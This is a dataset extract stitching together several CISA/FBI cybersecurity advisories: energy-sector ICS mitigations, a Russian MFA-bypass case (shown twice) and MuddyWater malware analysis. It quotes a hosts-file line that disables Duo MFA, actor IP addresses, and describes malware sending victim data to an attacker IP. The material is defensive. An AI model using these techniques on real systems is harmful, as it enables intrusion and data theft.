CISA, the FBI, and DOE recommend Energy Sector and other critical infrastructure organizations implement the following mitigations to harden their corporate enterprise network. These mitigations are tailored to combat multiple enterprise techniques observed in these campaigns (refer to Appendix A for observed TTPs and additional mitigations).
Privileged Account Management 

Manage the creation of, modification of, use of—and permissions associated with—privileged accounts, including SYSTEM and root.

Password Policies

Set and enforce secure password policies for accounts.

Disable or Remove Features or Programs

Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.

Audit 

Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc., to identify potential weaknesses.

Operating System Configuration 

Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.

Multifactor Authentication

Enforce multifactor authentication (MFA) by requiring users to provide two or more pieces of information (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.

Filter Network Traffic    

Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.

Network Segmentation

Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a demilitarized zone (DMZ) to contain any internet-facing services that should not be exposed from the internal network.

Limit Access to Resources over the Network

Prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, Remote Desktop Protocol (RDP) gateways, etc.

Execution Prevention

Block execution of code on a system through application control, and/or script blocking.

Industrial Control System Environment
CISA, the FBI, and DOE recommend Energy Sector and other critical infrastructure organizations implement the following mitigations to harden their ICS/OT environment.
Network Segmentation

Implement and ensure robust network segmentation between IT and ICS networks to limit the ability of cyber threat actors to move laterally to ICS networks if the IT network is compromised. 

Implement a network topology for ICS that has multiple layers, with the most critical communications occurring in the most secure and reliable layer. For more information refer to National Institute of Standard and Technology Special Publication 800-82: Guide to Industrial Control Systems (ICS) Security. Further segmentation should be applied to portions of the network that are reliant on one another by functionality. Figure 5 on page 26 of the CISA ICS Defense in Depth Strategy document describes this architecture.
Use one-way communication diodes to prevent external access, whenever possible.
Set up DMZs to create a physical and logical subnetwork that acts as an intermediary for connected security devices to avoid exposure.
Employ reliable network security protocols and services where feasible.


Consider using virtual local area networks (VLANs) for additional network segmentation, for example, by placing all printers in separate, dedicated VLANs and restricting users’ direct printer access. This same principle can be applied to segmentation of portions of the process for which devices are used. As an example, systems that are only involved in the creation of one component within an assembly line that is not directly related to another component can be on separate VLANs, which allows for identification of any unexpected communication, as well as segmentation against potential risk exposure on a larger scale.
Implement perimeter security between network segments to limit the ability of cyber threat actors to move laterally. 

Control traffic between network segments by using firewalls, intrusion detection systems (IDSs), and rules for filtering traffic on routers and switches.
Implement network monitoring at key chokepoints—including egress points to the internet, between network segments, core switch locations—and at key assets or services (e.g., remote access services).
Configure an IDS to create alarms for any ICS traffic outside normal operations (after establishing a baseline of normal operations and network traffic).
Configure security incident and event monitoring to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.



ICS Best Practices

Update all software. Use a risk-based assessment strategy to determine which ICS networks, assets, and zones should participate in the patch management program. 
Test all patches in out-of-band testing environments before implementation into production environments.
Implement application allow listing on human machine interfaces and engineering workstations.
Harden software configuration on field devices, including tablets and smartphones.
Replace all end-of-life software and hardware devices.
Disable unused ports and services on ICS devices (after testing to ensure this will not affect ICS operation).
Restrict and manage remote access software. Enforce MFA for remote access to ICS networks.
Configure encryption and security for network protocols within the ICS environment.
Do not allow vendors to connect their devices to the ICS network. Use of a compromised device could introduce malware. 
Disallow any devices that do not live solely on the ICS environment from communicating on the platform. ‘Transient devices’ provide risk exposure to the ICS environment from malicious activity in the IT or other environments to which they connect.
Maintain an ICS asset inventory of all hardware, software, and supporting infrastructure technologies. 
Maintain robust host logging on critical devices within the ICS environment, such as jump boxes, domain controllers, repository servers, etc. These logs should be aggregated into a centralized log server for review. 
Ensure robust physical security is in place to prevent unauthorized personal from accessing controlled spaces that house ICS equipment.
Regularly test manual controls so that critical functions can be kept running if ICS/OT networks need to be taken offline.

Contact Information
Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472). and/or to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.
References,1, https://www.justice.gov/opa/pr/four-russian-government-employees-charged-two-historical-hacking-campaigns-targeting-critical,2, https://collaborate.mitre.org/attackics/index.php/Software/S0003,3, https://collaborate.mitre.org/attackics/index.php/Software/S0003,4, https://collaborate.mitre.org/attackics/index.php/Software/S0013 
APPENDIX A: CAMPAIGN AND MALWARE TACTICS, TECHNIQUES, AND PROCEDURES
Global Energy Sector Campaign: Havex Malware 
Table 1 maps Havex’s capabilities to the ATT&CK for Enterprise framework, and table 2 maps Havex’s capabilities to the ATT&CK for ICS framework. Table 1 also provides associated mitigations. For additional mitigations, refer to the Mitigations section of this advisory.
Table 1: Enterprise Domain Tactics and Techniques for Havex,2,

 
Table 2: ICS Domain Tactics and Techniques for Havex,3,

 
Global Energy Sector Campaign: 2016 to 2018 U.S. Energy Sector Targeting
Table 3 maps the 2016 to 2018 U.S. Energy Sector targeting activity to the MITRE ATT&CK Enterprise framework. Mitigations for techniques are also provided in table. For additional mitigations, refer to the Mitigations section of this advisory.
Table 3: Energy Sector Campaign, 2016 to 2018 targeting U.S. Energy Sector: Observed MITRE ATT&CK Enterprise Tactics and Techniques

 
TRITON Malware
Table 4 maps TRITON’s capabilities to the ATT&CK for ICS framework. For mitigations to harden ICS/OT environments, refer to the Mitigations section of this advisory.
Table 4: ICS Domain Tactics and Techniques for TRITON,4,


Revisions

March 24, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-083a
52,"




Summary

Multifactor Authentication (MFA): A Cybersecurity Essential• MFA is one of the most important cybersecurity practices to reduce the risk of intrusions—according to industry research, users who enable MFA are up to 99 percent less likely to have an account compromised.• Every organization should enforce MFA for all employees and customers, and every user should sign up for MFA when available.• Organizations that implement MFA should review default configurations and modify as necessary, to reduce the likelihood that a sophisticated adversary can circumvent this control.
The Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to warn organizations that Russian state-sponsored cyber actors have gained network access through exploitation of default MFA protocols and a known vulnerability. As early as May 2021, Russian state-sponsored cyber actors took advantage of a misconfigured account set to default MFA protocols at a non-governmental organization (NGO), allowing them to enroll a new device for MFA and access the victim network. The actors then exploited a critical Windows Print Spooler vulnerability, “PrintNightmare” (CVE-2021-34527) to run arbitrary code with system privileges. Russian state-sponsored cyber actors successfully exploited the vulnerability while targeting an NGO using Cisco’s Duo MFA, enabling access to cloud and email accounts for document exfiltration.
This advisory provides observed tactics, techniques, and procedures, indicators of compromise (IOCs), and recommendations to protect against Russian state-sponsored malicious cyber activity. FBI and CISA urge all organizations to apply the recommendations in the Mitigations section of this advisory, including the following:

Enforce MFA and review configuration policies to protect against “fail open” and re-enrollment scenarios.
Ensure inactive accounts are disabled uniformly across the Active Directory and MFA systems. 
Patch all systems. Prioritize patching for known exploited vulnerabilities.

For more general information on Russian state-sponsored malicious cyber activity, see CISA's Russia Cyber Threat Overview and Advisories webpage. For more information on the threat of Russian state-sponsored malicious cyber actors to U.S. critical infrastructure as well as additional mitigation recommendations, see joint CSA Understanding and Mitigating Russian State-Sponsored Cyber Threats to U.S. Critical Infrastructure and CISA's Shields Up Technical Guidance webpage.
Click here for a PDF version of this report.
For a downloadable copy of IOCs, see AA22-074A.stix.
 

Technical Details

Threat Actor Activity
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 10. See Appendix A for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
As early as May 2021, the FBI observed Russian state-sponsored cyber actors gain access to an NGO, exploit a flaw in default MFA protocols, and move laterally to the NGO’s cloud environment.
Russian state-sponsored cyber actors gained initial access [TA0001] to the victim organization via compromised credentials [T1078] and enrolling a new device in the organization’s Duo MFA. The actors gained the credentials [TA0006] via brute-force password guessing attack [T1110.001], allowing them access to a victim account with a simple, predictable password. The victim account had been un-enrolled from Duo due to a long period of inactivity but was not disabled in the Active Directory. As Duo’s default configuration settings allow for the re-enrollment of a new device for dormant accounts, the actors were able to enroll a new device for this account, complete the authentication requirements, and obtain access to the victim network.  
Using the compromised account, Russian state-sponsored cyber actors performed privilege escalation [TA0004] via exploitation of the “PrintNightmare” vulnerability (CVE-2021-34527) [T1068] to obtain administrator privileges. The actors also modified a domain controller file, c:\windows\system32\drivers\etc\hosts, redirecting Duo MFA calls to localhost instead of the Duo server [T1556]. This change prevented the MFA service from contacting its server to validate MFA login—this effectively disabled MFA for active domain accounts because the default policy of Duo for Windows is to “Fail open” if the MFA server is unreachable. Note: “fail open” can happen to any MFA implementation and is not exclusive to Duo.
After effectively disabling MFA, Russian state-sponsored cyber actors were able to successfully authenticate to the victim’s virtual private network (VPN) as non-administrator users and make Remote Desktop Protocol (RDP) connections to Windows domain controllers [T1133]. The actors ran commands to obtain credentials for additional domain accounts; then using the method described in the previous paragraph, changed the MFA configuration file and bypassed MFA for these newly compromised accounts. The actors leveraged mostly internal Windows utilities already present within the victim network to perform this activity.  
Using these compromised accounts without MFA enforced, Russian state-sponsored cyber actors were able to move laterally [TA0008] to the victim’s cloud storage and email accounts and access desired content. 
Indicators of Compromise
Russian state-sponsored cyber actors executed the following processes:

ping.exe - A core Windows Operating System process used to perform the Transmission Control Protocol (TCP)/IP Ping command; used to test network connectivity to a remote host [T1018] and is frequently used by actors for network discovery [TA0007].
regedit.exe - A standard Windows executable file that opens the built-in registry editor [T1112].
rar.exe - A data compression, encryption, and archiving tool [T1560.001]. Malicious cyber actors have traditionally sought to compromise MFA security protocols as doing so would provide access to accounts or information of interest. 
ntdsutil.exe - A command-line tool that provides management facilities for Active Directory Domain Services. It is possible this tool was used to enumerate Active Directory user accounts [T1003.003].

Actors modified the c:\windows\system32\drivers\etc\hosts file to prevent communication with the Duo MFA server:

127.0.0.1 api-<redacted>.duosecurity.com 

The following access device IP addresses used by the actors have been identified to date:

45.32.137[.]94
191.96.121[.]162
173.239.198[.]46
157.230.81[.]39 


Mitigations

The FBI and CISA recommend organizations remain cognizant of the threat of state-sponsored cyber actors exploiting default MFA protocols and exfiltrating sensitive information. Organizations should:

Enforce MFA for all users, without exception. Before implementing, organizations should review configuration policies to protect against “fail open” and re-enrollment scenarios.
Implement time-out and lock-out features in response to repeated failed login attempts.
Ensure inactive accounts are disabled uniformly across the Active Directory, MFA systems etc.
Update software, including operating systems, applications, and firmware on IT network assets in a timely manner. Prioritize patching known exploited vulnerabilities, especially critical and high vulnerabilities that allow for remote code execution or denial-of-service on internet-facing equipment.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access.
Continuously monitor network logs for suspicious activity and unauthorized or unusual login attempts.
Implement security alerting policies for all changes to security-enabled accounts/groups, and alert on suspicious process creation events (ntdsutil, rar, regedit, etc.).

Note: If a domain controller compromise is suspected, a domain-wide password reset—including service accounts, Microsoft 365 (M365) synchronization accounts, and krbtgt—will be necessary to remove the actors’ access. (For more information, see https://docs.microsoft.com/en-us/answers/questions/87978/reset-krbtgt-password.html). Consider soliciting support from a third-party IT organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.  
FBI and CISA also recommend organizations implement the recommendations listed below to further reduce the risk of malicious cyber activity.
Security Best Practices

Deploy Local Administrator Password Solution (LAPS), enforce Server Message Block (SMB) Signing, restrict Administrative privileges (local admin users, groups, etc.), and review sensitive materials on domain controller’s SYSVOL share.
Enable increased logging policies, enforce PowerShell logging, and ensure antivirus/endpoint detection and response (EDR) are deployed to all endpoints and enabled.
Routinely verify no unauthorized system modifications, such as additional accounts and Secure Shell (SSH) keys, have occurred to help detect a compromise. To detect these modifications, administrators can use file integrity monitoring software that alerts an administrator or blocks unauthorized changes on the system. 

Network Best Practices

Monitor remote access/ RDP logs and disable unused remote access/RDP ports.
Deny atypical inbound activity from known anonymization services, to include commercial VPN services and The Onion Router (TOR).
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Regularly audit administrative user accounts and configure access control under the concept of least privilege. 
Regularly audit logs to ensure new accounts are legitimate users.
Scan networks for open and listening ports and mediate those that are unnecessary.
Maintain historical network activity logs for at least 180 days, in case of a suspected compromise.
Identify and create offline backups for critical assets.
Implement network segmentation.
Automatically update anti-virus and anti-malware solutions and conduct regular virus and malware scans.

Remote Work Environment Best Practices
With an increase in remote work environments and the use of VPN services, the FBI and CISA encourage organizations to implement the following best practices to improve network security:

Regularly update VPNs, network infrastructure devices, and devices used for remote work environments with the latest software patches and security configurations.
When possible, implement multi-factor authentication on all VPN connections. Physical security tokens are the most secure form of MFA, followed by authenticator applications. When MFA is unavailable, require employees engaging in remote work to use strong passwords.
Monitor network traffic for unapproved and unexpected protocols.
Reduce potential attack surfaces by discontinuing unused VPN servers that may be used as a point of entry for attackers.

User Awareness Best Practices
Cyber actors frequently use unsophisticated methods to gain initial access, which can often be mitigated by stronger employee awareness of indicators of malicious activity. The FBI and CISA recommend the following best practices to improve employee operations security when conducting business:

Provide end-user awareness and training. To help prevent targeted social engineering and spearphishing scams, ensure that employees and stakeholders are aware of potential cyber threats and delivery methods. Also, provide users with training on information security principles and techniques. 
Inform employees of the risks associated with posting detailed career information to social or professional networking sites.
Ensure that employees are aware of what to do and whom to contact when they see suspicious activity or suspect a cyberattack, to help quickly and efficiently identify threats and employ mitigation strategies.

Information Requested
All organizations should report incidents and anomalous activity to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov and SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472).
APPENDIX A: Threat Actor Tactics and Techniques
See table 1 for the threat actors’ tactics and techniques identified in this CSA. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
Table 1: Threat Actor MITRE ATT&CK Tactics and Techniques



Tactic
Technique




Initial Access [TA0001]
Valid Accounts [T1078]


Persistence [TA0003]
External Remote Services [T1133]


Modify Authentication Process [T1556]


Privilege Escalation [TA0004]
Exploitation for Privilege Escalation[T1068]


Defense Evasion [TA0005]
Modify Registry [T1112]


Credential Access [TA0006]
Brute Force: Password Guessing [T1110.001]


OS Credential Dumping: NTDS [T1003.003]


Discovery [TA0007]
Remote System Discovery [T1018]


Lateral Movement [TA0008] 
 


Collection [TA0009]
Archive Collected Data: Archive via Utility [T1560.001]




Revisions

March 15, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0006', 'TA0003', 'TA0008', 'T1068', 'T1560.001', 'T1003.003', 'TA0009', 'T1018', 'TA0001', 'TA0004', 'T1112', 'T1133', 'T1556', 'TA0007', 'TA0005', 'T1078', 'T1110.001'}","




Summary

Multifactor Authentication (MFA): A Cybersecurity Essential• MFA is one of the most important cybersecurity practices to reduce the risk of intrusions—according to industry research, users who enable MFA are up to 99 percent less likely to have an account compromised.• Every organization should enforce MFA for all employees and customers, and every user should sign up for MFA when available.• Organizations that implement MFA should review default configurations and modify as necessary, to reduce the likelihood that a sophisticated adversary can circumvent this control.
The Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to warn organizations that Russian state-sponsored cyber actors have gained network access through exploitation of default MFA protocols and a known vulnerability. As early as May 2021, Russian state-sponsored cyber actors took advantage of a misconfigured account set to default MFA protocols at a non-governmental organization (NGO), allowing them to enroll a new device for MFA and access the victim network. The actors then exploited a critical Windows Print Spooler vulnerability, “PrintNightmare” (CVE-2021-34527) to run arbitrary code with system privileges. Russian state-sponsored cyber actors successfully exploited the vulnerability while targeting an NGO using Cisco’s Duo MFA, enabling access to cloud and email accounts for document exfiltration.
This advisory provides observed tactics, techniques, and procedures, indicators of compromise (IOCs), and recommendations to protect against Russian state-sponsored malicious cyber activity. FBI and CISA urge all organizations to apply the recommendations in the Mitigations section of this advisory, including the following:

Enforce MFA and review configuration policies to protect against “fail open” and re-enrollment scenarios.
Ensure inactive accounts are disabled uniformly across the Active Directory and MFA systems. 
Patch all systems. Prioritize patching for known exploited vulnerabilities.

For more general information on Russian state-sponsored malicious cyber activity, see CISA's Russia Cyber Threat Overview and Advisories webpage. For more information on the threat of Russian state-sponsored malicious cyber actors to U.S. critical infrastructure as well as additional mitigation recommendations, see joint CSA Understanding and Mitigating Russian State-Sponsored Cyber Threats to U.S. Critical Infrastructure and CISA's Shields Up Technical Guidance webpage.
Click here for a PDF version of this report.
For a downloadable copy of IOCs, see AA22-074A.stix.
 

Technical Details

Threat Actor Activity
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 10. See Appendix A for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
As early as May 2021, the FBI observed Russian state-sponsored cyber actors gain access to an NGO, exploit a flaw in default MFA protocols, and move laterally to the NGO’s cloud environment.
Russian state-sponsored cyber actors gained initial access, to the victim organization via compromised credentials, and enrolling a new device in the organization’s Duo MFA. The actors gained the credentials, via brute-force password guessing attack, allowing them access to a victim account with a simple, predictable password. The victim account had been un-enrolled from Duo due to a long period of inactivity but was not disabled in the Active Directory. As Duo’s default configuration settings allow for the re-enrollment of a new device for dormant accounts, the actors were able to enroll a new device for this account, complete the authentication requirements, and obtain access to the victim network.  
Using the compromised account, Russian state-sponsored cyber actors performed privilege escalation, via exploitation of the “PrintNightmare” vulnerability (CVE-2021-34527), to obtain administrator privileges. The actors also modified a domain controller file, c:\windows\system32\drivers\etc\hosts, redirecting Duo MFA calls to localhost instead of the Duo server,. This change prevented the MFA service from contacting its server to validate MFA login—this effectively disabled MFA for active domain accounts because the default policy of Duo for Windows is to “Fail open” if the MFA server is unreachable. Note: “fail open” can happen to any MFA implementation and is not exclusive to Duo.
After effectively disabling MFA, Russian state-sponsored cyber actors were able to successfully authenticate to the victim’s virtual private network (VPN) as non-administrator users and make Remote Desktop Protocol (RDP) connections to Windows domain controllers,. The actors ran commands to obtain credentials for additional domain accounts; then using the method described in the previous paragraph, changed the MFA configuration file and bypassed MFA for these newly compromised accounts. The actors leveraged mostly internal Windows utilities already present within the victim network to perform this activity.  
Using these compromised accounts without MFA enforced, Russian state-sponsored cyber actors were able to move laterally, to the victim’s cloud storage and email accounts and access desired content. 
Indicators of Compromise
Russian state-sponsored cyber actors executed the following processes:

ping.exe - A core Windows Operating System process used to perform the Transmission Control Protocol (TCP)/IP Ping command; used to test network connectivity to a remote host, and is frequently used by actors for network discovery,.
regedit.exe - A standard Windows executable file that opens the built-in registry editor,.
rar.exe - A data compression, encryption, and archiving tool,. Malicious cyber actors have traditionally sought to compromise MFA security protocols as doing so would provide access to accounts or information of interest. 
ntdsutil.exe - A command-line tool that provides management facilities for Active Directory Domain Services. It is possible this tool was used to enumerate Active Directory user accounts,.

Actors modified the c:\windows\system32\drivers\etc\hosts file to prevent communication with the Duo MFA server:

127.0.0.1 api-<redacted>.duosecurity.com 

The following access device IP addresses used by the actors have been identified to date:

45.32.137,.,94
191.96.121,.,162
173.239.198,.,46
157.230.81,.,39 


Mitigations

The FBI and CISA recommend organizations remain cognizant of the threat of state-sponsored cyber actors exploiting default MFA protocols and exfiltrating sensitive information. Organizations should:

Enforce MFA for all users, without exception. Before implementing, organizations should review configuration policies to protect against “fail open” and re-enrollment scenarios.
Implement time-out and lock-out features in response to repeated failed login attempts.
Ensure inactive accounts are disabled uniformly across the Active Directory, MFA systems etc.
Update software, including operating systems, applications, and firmware on IT network assets in a timely manner. Prioritize patching known exploited vulnerabilities, especially critical and high vulnerabilities that allow for remote code execution or denial-of-service on internet-facing equipment.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access.
Continuously monitor network logs for suspicious activity and unauthorized or unusual login attempts.
Implement security alerting policies for all changes to security-enabled accounts/groups, and alert on suspicious process creation events (ntdsutil, rar, regedit, etc.).

Note: If a domain controller compromise is suspected, a domain-wide password reset—including service accounts, Microsoft 365 (M365) synchronization accounts, and krbtgt—will be necessary to remove the actors’ access. (For more information, see https://docs.microsoft.com/en-us/answers/questions/87978/reset-krbtgt-password.html). Consider soliciting support from a third-party IT organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.  
FBI and CISA also recommend organizations implement the recommendations listed below to further reduce the risk of malicious cyber activity.
Security Best Practices

Deploy Local Administrator Password Solution (LAPS), enforce Server Message Block (SMB) Signing, restrict Administrative privileges (local admin users, groups, etc.), and review sensitive materials on domain controller’s SYSVOL share.
Enable increased logging policies, enforce PowerShell logging, and ensure antivirus/endpoint detection and response (EDR) are deployed to all endpoints and enabled.
Routinely verify no unauthorized system modifications, such as additional accounts and Secure Shell (SSH) keys, have occurred to help detect a compromise. To detect these modifications, administrators can use file integrity monitoring software that alerts an administrator or blocks unauthorized changes on the system. 

Network Best Practices

Monitor remote access/ RDP logs and disable unused remote access/RDP ports.
Deny atypical inbound activity from known anonymization services, to include commercial VPN services and The Onion Router (TOR).
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Regularly audit administrative user accounts and configure access control under the concept of least privilege. 
Regularly audit logs to ensure new accounts are legitimate users.
Scan networks for open and listening ports and mediate those that are unnecessary.
Maintain historical network activity logs for at least 180 days, in case of a suspected compromise.
Identify and create offline backups for critical assets.
Implement network segmentation.
Automatically update anti-virus and anti-malware solutions and conduct regular virus and malware scans.

Remote Work Environment Best Practices
With an increase in remote work environments and the use of VPN services, the FBI and CISA encourage organizations to implement the following best practices to improve network security:

Regularly update VPNs, network infrastructure devices, and devices used for remote work environments with the latest software patches and security configurations.
When possible, implement multi-factor authentication on all VPN connections. Physical security tokens are the most secure form of MFA, followed by authenticator applications. When MFA is unavailable, require employees engaging in remote work to use strong passwords.
Monitor network traffic for unapproved and unexpected protocols.
Reduce potential attack surfaces by discontinuing unused VPN servers that may be used as a point of entry for attackers.

User Awareness Best Practices
Cyber actors frequently use unsophisticated methods to gain initial access, which can often be mitigated by stronger employee awareness of indicators of malicious activity. The FBI and CISA recommend the following best practices to improve employee operations security when conducting business:

Provide end-user awareness and training. To help prevent targeted social engineering and spearphishing scams, ensure that employees and stakeholders are aware of potential cyber threats and delivery methods. Also, provide users with training on information security principles and techniques. 
Inform employees of the risks associated with posting detailed career information to social or professional networking sites.
Ensure that employees are aware of what to do and whom to contact when they see suspicious activity or suspect a cyberattack, to help quickly and efficiently identify threats and employ mitigation strategies.

Information Requested
All organizations should report incidents and anomalous activity to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov and SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472).
APPENDIX A: Threat Actor Tactics and Techniques
See table 1 for the threat actors’ tactics and techniques identified in this CSA. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
Table 1: Threat Actor MITRE ATT&CK Tactics and Techniques


Revisions

March 15, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-074a
53,"




Summary

Actions to Take Today to Protect Against Malicious Activity
* Search for indicators of compromise.
* Use antivirus software.
* Patch all systems.
* Prioritize patching known exploited vulnerabilities.
* Train users to recognize and report phishing attempts.
* Use multi-factor authentication.
Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Cyber Command Cyber National Mission Force (CNMF), and the United Kingdom’s National Cyber Security Centre (NCSC-UK) have observed a group of Iranian government-sponsored advanced persistent threat (APT) actors, known as MuddyWater, conducting cyber espionage and other malicious cyber operations targeting a range of government and private-sector organizations across sectors—including telecommunications, defense, local government, and oil and natural gas—in Asia, Africa, Europe, and North America. Note: MuddyWater is also known as Earth Vetala, MERCURY, Static Kitten, Seedworm, and TEMP.Zagros.
MuddyWater is a subordinate element within the Iranian Ministry of Intelligence and Security (MOIS).[1] This APT group has conducted broad cyber campaigns in support of MOIS objectives since approximately 2018. MuddyWater actors are positioned both to provide stolen data and accesses to the Iranian government and to share these with other malicious cyber actors.
MuddyWater actors are known to exploit publicly reported vulnerabilities and use open-source tools and strategies to gain access to sensitive data on victims’ systems and deploy ransomware. These actors also maintain persistence on victim networks via tactics such as side-loading dynamic link libraries (DLLs)—to trick legitimate programs into running malware—and obfuscating PowerShell scripts to hide command and control (C2) functions. FBI, CISA, CNMF, and NCSC-UK have observed MuddyWater actors recently using various malware—variants of PowGoop, Small Sieve, Canopy (also known as Starwhale), Mori, and POWERSTATS—along with other tools as part of their malicious activity. 
This advisory provides observed tactics, techniques, and procedures (TTPs); malware; and indicators of compromise (IOCs) associated with this Iranian government-sponsored APT activity to aid organizations in the identification of malicious activity against sensitive networks. 
FBI, CISA, CNMF, NCSC-UK, and the National Security Agency (NSA) recommend organizations apply the mitigations in this advisory and review the following resources for additional information. Note: also see the Additional Resources section.

Malware Analysis Report – MAR-10369127-1.v1: MuddyWater
IOCs – AA22-052A.stix and MAR-10369127-1.v1.stix
CISA's webpage – Iran Cyber Threat Overview and Advisories
NCSC-UK MAR – Small Sieve
CNMF's press release – Iranian intel cyber suite of malware uses open source tools

Click here for a PDF version of this report.

Technical Details

FBI, CISA, CNMF, and NCSC-UK have observed the Iranian government-sponsored MuddyWater APT group employing spearphishing, exploiting publicly known vulnerabilities, and leveraging multiple open-source tools to gain access to sensitive government and commercial networks. 
As part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into downloading ZIP files, containing either an Excel file with a malicious macro that communicates with the actor’s C2 server or a PDF file that drops a malicious file to the victim’s network [T1566.001, T1204.002]. MuddyWater actors also use techniques such as side-loading DLLs [T1574.002] to trick legitimate programs into running malware and obfuscating PowerShell scripts [T1059.001] to hide C2 functions [T1027] (see the PowGoop section for more information). 
Additionally, the group uses multiple malware sets—including PowGoop, Small Sieve, Canopy/Starwhale, Mori, and POWERSTATS—for loading malware, backdoor access, persistence [TA0003], and exfiltration [TA0010]. See below for descriptions of some of these malware sets, including newer tools or variants to the group’s suite. Additionally, see Malware Analysis Report MAR-10369127.r1.v1: MuddyWater for further details.
PowGoop
MuddyWater actors use new variants of PowGoop malware as their main loader in malicious operations; it consists of a DLL loader and a PowerShell-based downloader. The malicious file impersonates a legitimate file that is signed as a Google Update executable file.
According to samples of PowGoop analyzed by CISA and CNMF, PowGoop consists of three components:

A DLL file renamed as a legitimate filename, Goopdate.dll, to enable the DLL side-loading technique [T1574.002]. The DLL file is contained within an executable, GoogleUpdate.exe. 
A PowerShell script, obfuscated as a .dat file, goopdate.dat, used to decrypt and run a second obfuscated PowerShell script, config.txt [T1059.001].
config.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded IP address.

These components retrieve encrypted commands from a C2 server. The DLL file hides communications with MuddyWater C2 servers by executing with the Google Update service. 
Small Sieve
According to a sample analyzed by NCSC-UK, Small Sieve is a simple Python [T1059.006] backdoor distributed using a Nullsoft Scriptable Install System (NSIS) installer, gram_app.exe. The NSIS installs the Python backdoor, index.exe, and adds it as a registry run key [T1547.001], enabling persistence [TA0003]. 
MuddyWater disguises malicious executables and uses filenames and Registry key names associated with Microsoft's Windows Defender to avoid detection during casual inspection. The APT group has also used variations of Microsoft (e.g., ""Microsift"") and Outlook in its filenames associated with Small Sieve [T1036.005].
Small Sieve provides basic functionality required to maintain and expand a foothold in victim infrastructure and avoid detection [TA0005] by using custom string and traffic obfuscation schemes together with the Telegram Bot application programming interface (API). Specifically, Small Sieve’s beacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure (HTTPS) [T1071.001], and the tasking and beaconing data is obfuscated through a hex byte swapping encoding scheme combined with an obfuscated Base64 function [T1027], T1132.002].
Note: cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to MuddyWater with high confidence. 
See Appendix B for further analysis of Small Sieve malware.
Canopy
MuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with targeted attachments [T1566.001]. According to two Canopy/Starwhale samples analyzed by CISA, Canopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file. Note: the cybersecurity agencies of the United Kingdom and the United States attribute these malware samples to MuddyWater with high confidence. 
In the samples CISA analyzed, a malicious Excel file, Cooperation terms.xls, contained macros written in Visual Basic for Applications (VBA) and two encoded Windows Script Files. When the victim opens the Excel file, they receive a prompt to enable macros [T1204.002]. Once this occurs, the macros are executed, decoding and installing the two embedded Windows Script Files.
The first .wsf is installed in the current user startup folder [T1547.001] for persistence. The file contains hexadecimal (hex)-encoded strings that have been reshuffled [T1027]. The file executes a command to run the second .wsf.
The second .wsf also contains hex-encoded strings that have been reshuffled. This file collects [TA0035] the victim system’s IP address, computer name, and username [T1005]. The collected data is then hex-encoded and sent to an adversary-controlled IP address, http[:]88.119.170[.]124, via an HTTP POST request [T1041].
Mori
MuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate with the group’s C2 infrastructure [T1572]. 
According to one sample analyzed by CISA, FML.dll, Mori uses a DLL written in C++ that is executed with regsvr32.exe with export DllRegisterServer; this DLL appears to be a component to another program. FML.dll contains approximately 200MB of junk data [T1001.001] in a resource directory 205, number 105. Upon execution, FML.dll creates a mutex, 0x50504060, and performs the following tasks:

Deletes the file FILENAME.old and deletes file by registry value. The filename is the DLL file with a .old extension.
Resolves networking APIs from strings that are ADD-encrypted with the key 0x05.
